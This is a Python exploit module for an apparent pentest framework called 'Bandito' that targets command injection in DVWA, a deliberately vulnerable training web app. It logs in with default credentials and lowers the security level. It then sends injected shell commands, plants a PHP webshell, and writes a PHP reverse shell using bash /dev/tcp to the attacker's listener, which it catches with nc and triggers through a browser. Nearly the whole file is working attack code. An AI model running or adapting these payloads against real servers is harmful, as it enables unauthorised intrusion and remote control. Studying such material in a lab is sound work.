from base_module import BaseModule
from utils import colored
import requests
import subprocess
import webbrowser
import os
import re

class DVWARCE(BaseModule):
    def __init__(self):
        super().__init__()
        self.name = "dvwa_rce"
        self.description = "DVWA Command Injection → RCE (Parts 1 & 2) \n Next see the parameters to set with 'OPTIONS', then use 'RUN'"

        self.options = {
            "RHOST": {"value": "", "required": True, "description": "Target DVWA IP or URL - use set before setup"},
            "RPORT": {"value": "80", "required": True, "description": "Target DVWA port"},
            "LHOST": {"value": "", "required": True, "description": "Listener IP (your machine) - use set before setup"},
            "LPORT": {"value": "4444", "required": True, "description": "Listener port for reverse shell"},
            "USERNAME": {"value": "admin", "required": True, "description": "DVWA username"},
            "PASSWORD": {"value": "password", "required": True, "description": "DVWA password"},
        }

        self.session = None
        self.logged_in = False
        self.upload_path = "/srv/dvwa/hackable/uploads"  # added here so it's accessible

    def show_options(self):
        print(colored(f"\nModule options ({self.name}):", "orange"))

        # Collect options into a list so we can calculate real max widths
        option_rows = []
        for name, data in self.options.items():
            value = str(data.get("value", ""))
            required = "yes" if data.get("required") else "no"
            desc = data.get("description", "")
            option_rows.append((name, value, required, desc))

        # Calculate dynamic column widths based on actual content
        name_width   = max(15, max(len(row[0]) for row in option_rows) + 2)
        value_width  = max(30, max(len(row[1]) for row in option_rows) + 2)
        req_width    = max(10, max(len(row[2]) for row in option_rows) + 2)
        # Description gets remaining space — no fixed width

        # Header
        header = f"{'Name':<{name_width}} {'Current Setting':<{value_width}} {'Required':<{req_width}} Description"
        print(colored(header, "yellow"))
        print("-" * (name_width + value_width + req_width + 40))  # generous total width

        # Rows
        for name, value, required, desc in option_rows:
            # Truncate long values so they don't push other columns
            value_str = value[:value_width-3] + "..." if len(value) > value_width-3 else value
            print(f"{name:<{name_width}} {colored(value_str, 'green'):<{value_width}} {colored(required, 'red'):<{req_width}} {desc}")
            
    def show_help(self):
        print(colored("\n=== DVWA RCE Module ===", "orange"))
        print("This module exploits DVWA Command Injection for RCE")
        print("Make sure to SET the options you need to before running setup")
        print("1. Set options (RHOST, LHOST, etc.) using 'set <name> <value>'")
        print("2. Type 'run' to login and prepare the session")
        print("3. Use 'shell', 'upload_webshell', or 'upload_revshell'")
        print("\nCommands:")
        print("  run                  - Login + set security to Low")
        print("  shell                - Interactive command shell (Part 1)")
        print("  upload_webshell      - Upload simple webshell (Part 2)")
        print("  upload_revshell      - Upload + auto-catch reverse shell (Part 2)")
        print("  set <option> <value> - Set RHOST, LHOST, LPORT, etc.")
        print("  show options         - Show current settings")
        print("  help                 - Show this help")
        print("  back / exit          - Return to framework\n")

    def handle_command(self, cmd_input):
        cmd = cmd_input.strip()
        low = cmd.lower()

        if low in ["help", "show options"]:
            self.show_options()
            self.show_help()
            return

        if low.startswith("set "):
            parts = cmd.split(maxsplit=2)
            if len(parts) < 3:
                print("Usage: set <option> <value>")
                return
            option = parts[1].upper()
            value = parts[2]

            if option in self.options:
                self.options[option]["value"] = value
                print(colored(f"{option} → {value}", "green"))
            else:
                print(colored(f"Unknown option: {option}", "red"))
            return

        if low in ["run", "exploit"]:
            self.run()
            return

        if not self.logged_in:
            print(colored("[-] Not logged in. Type 'run' first.", "red"))
            return

        if low == "shell":
            self.interactive_shell()
            return

        if low == "upload_webshell":
            self.upload_webshell()
            return

        if low == "upload_revshell":
            self.upload_revshell()
            return

        if low in ["back", "exit", "quit"]:
            print(colored("[*] Returning to Bandito framework...", "yellow"))
            return

        print(colored(f"[-] Unknown command: {cmd}", "red"))
        print("Type 'help' for available commands.")

    def run(self):
        self._login()
        if self.logged_in:
            print(colored("\nExploit ready. Available actions:", "green"))
            print("  shell                - Start interactive shell")
            print("  upload_webshell      - Drop webshell")
            print("  upload_revshell      - Drop + auto-catch reverse shell")

    def _login(self):
        rhost = self.options["RHOST"]["value"]
        print(colored(f"[*] Logging into {rhost}...", "yellow"))

        self.session = requests.Session()
        login_url = f"http://{rhost}/login.php"
        print(colored(f"  Fetching login page: {login_url}", "yellow"))

        try:
            r_get = self.session.get(login_url, timeout=5)
            print(colored(f"  Status: {r_get.status_code}", "green"))
        except Exception as e:
            print(colored(f"[-] Failed to fetch login page: {e}", "red"))
            return

        # Robust token extraction
        token_match = re.search(r'name=[\'"]user_token[\'"]\s+value=[\'"]([a-f0-9]+)[\'"]', r_get.text, re.IGNORECASE)
        user_token = ""
        if token_match:
            user_token = token_match.group(1)
            print(colored(f"  [+] CSRF token obtained: {user_token}", "green"))
        else:
            print(colored("  [-] CSRF token not found in login page", "red"))
            print("  Response snippet (first 500 chars):")
            print(r_get.text[:500])
            return

        login_data = {
            "username": self.options["USERNAME"]["value"],
            "password": self.options["PASSWORD"]["value"],
            "user_token": user_token,
            "Login": "Login"
        }

        print(colored("  Attempting login...", "yellow"))
        r_login = self.session.post(login_url, data=login_data, allow_redirects=True)

        if "Logout" in r_login.text or r_login.status_code in (301, 302) or "Welcome" in r_login.text:
            print(colored("[+] Login successful", "green"))
        else:
            print(colored("[-] Login failed", "red"))
            print("  Status code:", r_login.status_code)
            print("  Response snippet (first 500 chars):")
            print(r_login.text[:500])
            return

        sec_url = f"http://{rhost}/security.php"
        print(colored("  Setting security level to Low...", "yellow"))
        self.session.post(sec_url, data={"security": "low", "seclev_submit": "Submit"})

        self.logged_in = True
        print(colored("[+] Security level set to Low", "green"))
        print(colored("\nExploit ready. Available actions:", "green"))
        print("  shell                - Start interactive shell")
        print("  upload_webshell      - Drop webshell")
        print("  upload_revshell      - Drop + auto-catch reverse shell")
        self.show_options()

    def interactive_shell(self):
        print(colored("\ndvwa> Interactive command shell (type 'exit' to return)", "yellow"))
        vuln_url = f"http://{self.options['RHOST']['value']}/vulnerabilities/exec/"

        while True:
            try:
                cmd = input("dvwa> ").strip()
                if cmd.lower() in ["exit", "back", "quit"]:
                    return
                if not cmd:
                    continue

                payload = f"127.0.0.1 >/dev/null 2>&1; {cmd}"
                data = {"ip": payload, "Submit": "Submit"}

                r = self.session.post(vuln_url, data=data)

                if "<pre>" in r.text and "</pre>" in r.text:
                    output = r.text.split("<pre>")[1].split("</pre>")[0].strip()
                else:
                    output = r.text.strip()

                print(output if output else "[no output]")
                print("-" * 60)

            except KeyboardInterrupt:
                print("\n[*] Interrupted")
                return

    def upload_webshell(self):
        webshell = '<?php if(isset($_GET["cmd"])){system($_GET["cmd"]);} ?>'
        safe = webshell.replace("'", "'\\''")

        cmd = f"echo '{safe}' > {self.upload_path}/shell.php"
        payload = f"127.0.0.1 >/dev/null 2>&1; {cmd}"
        data = {"ip": payload, "Submit": "Submit"}
        vuln_url = f"http://{self.options['RHOST']['value']}/vulnerabilities/exec/"

        self.session.post(vuln_url, data=data)

        print(colored("[+] Webshell uploaded", "green"))
        print(f"Test: {self.options['RHOST']['value']}/hackable/uploads/shell.php?cmd=whoami")

    def upload_revshell(self):
        rhost = self.options["RHOST"]["value"]
        lhost = self.options["LHOST"]["value"]
        lport = self.options["LPORT"]["value"]

        rev_content = f'<?php system("bash -c \'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1\' 2>&1"); ?>'
        safe_content = rev_content.replace("'", "'\\''")

        cmd = f"echo '{safe_content}' > {self.upload_path}/rev.php"
        payload = f"127.0.0.1 >/dev/null 2>&1; {cmd}"
        data = {"ip": payload, "Submit": "Submit"}
        vuln_url = f"http://{rhost}/vulnerabilities/exec/"

        self.session.post(vuln_url, data=data)

        trigger_url = f"http://{rhost}/hackable/uploads/rev.php"

        print(colored("[+] Reverse shell uploaded", "green"))
        print(f"Trigger URL: {trigger_url}")

        listener_cmd = f"nc -lvnp {lport}"
        print(colored(f"[*] Opening listener in new terminal: {listener_cmd}", "yellow"))

        try:
            subprocess.Popen(["gnome-terminal", "--", "bash", "-c", listener_cmd + "; echo '--- Reverse shell active ---'; exec bash"])
        except:
            try:
                subprocess.Popen(["xterm", "-e", listener_cmd])
            except:
                print(colored(f"[-] Could not open terminal. Run manually: {listener_cmd}", "red"))

        webbrowser.open(trigger_url)
        print(colored("Browser opened to trigger the shell.", "green"))